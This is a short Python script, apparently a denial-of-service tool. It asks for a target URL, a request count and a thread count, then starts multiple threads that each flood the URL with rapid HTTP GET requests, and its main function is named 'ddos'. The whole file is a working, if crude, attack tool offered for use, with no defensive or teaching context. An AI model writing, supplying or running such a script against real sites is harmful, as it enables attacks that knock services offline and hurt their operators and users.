import requests
import time
import threading

def ddos(url, times):
    for _ in range(times):
        requests.get(url)
        time.sleep(0.01)

def main():
    url = input("Enter the target URL: ")
    times = int(input("Enter the number of requests: "))
    threads = int(input("Enter the number of threads: "))

    threads = [threading.Thread(target=ddos, args=(url, times)) for _ in range(threads)]

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
